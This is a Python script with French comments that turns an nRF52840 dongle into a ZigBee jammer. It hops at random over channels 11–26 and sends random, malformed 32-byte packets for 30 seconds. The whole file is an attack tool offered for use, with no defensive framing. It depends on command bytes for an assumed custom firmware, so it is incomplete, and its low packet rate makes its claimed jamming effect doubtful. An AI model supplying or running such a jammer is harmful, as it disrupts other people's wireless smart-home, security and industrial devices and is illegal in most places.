import serial
import time
import random

# Configuration pour le dongle nRF52840
SERIAL_PORT = "/dev/ttyACM0"  # Modifier selon votre système (Windows: COMx)
BAUD_RATE = 115200            # Taux standard pour la communication série

# Canaux ZigBee (11 à 26)
CHANNELS = list(range(11, 27))

def set_channel(ser, channel):
    """
    Configure le canal ZigBee sur le dongle nRF52840.
    """
    if not (11 <= channel <= 26):
        print(f"Canal ZigBee invalide : {channel}")
        return
    
    # Exemple de commande pour configurer le canal
    # Assumes a custom firmware command: [0x01, CHANNEL]
    command = bytes([0x01, channel])  # 0x01 = Commande SET_CHANNEL
    ser.write(command)
    response = ser.readline().decode().strip()  # Lire la réponse du dongle
    print(f"Réponse du dongle : {response}")

def send_random_packet(ser):
    """
    Envoie un paquet ZigBee aléatoire/malformé.
    """
    # Exemple de paquet aléatoire de 32 octets (données fictives)
    packet_data = bytes([random.randint(0, 255) for _ in range(32)])
    
    # Assumes a custom firmware command: [0x02, PACKET_LENGTH, PAYLOAD...]
    command = bytes([0x02, len(packet_data)]) + packet_data
    ser.write(command)
    response = ser.readline().decode().strip()  # Lire la réponse du dongle
    print(f"Réponse du dongle : {response}")
    print(f"Paquet envoyé : {packet_data.hex()}")

def zigbee_jammer(ser, duration=10):
    """
    Active le jammer ZigBee en envoyant des paquets aléatoires sur plusieurs canaux.
    """
    start_time = time.time()
    while time.time() - start_time < duration:
        # Choisir un canal aléatoire
        channel = random.choice(CHANNELS)
        set_channel(ser, channel)
        
        # Envoyer un paquet aléatoire
        send_random_packet(ser)
        
        # Attendre un court délai avant de recommencer
        time.sleep(0.1)

def main():
    try:
        # Ouvrir une connexion série avec le dongle
        ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=1)
        print("Connexion au dongle nRF52840 réussie.")
        
        # Durée du brouillage en secondes
        jammer_duration = 30
        print(f"Activation du jammer pour {jammer_duration} secondes...")
        zigbee_jammer(ser, duration=jammer_duration)
        
        print("Jammer terminé. Déconnexion.")
        ser.close()
    except Exception as e:
        print(f"Erreur : {e}")

if __name__ == "__main__":
    main()
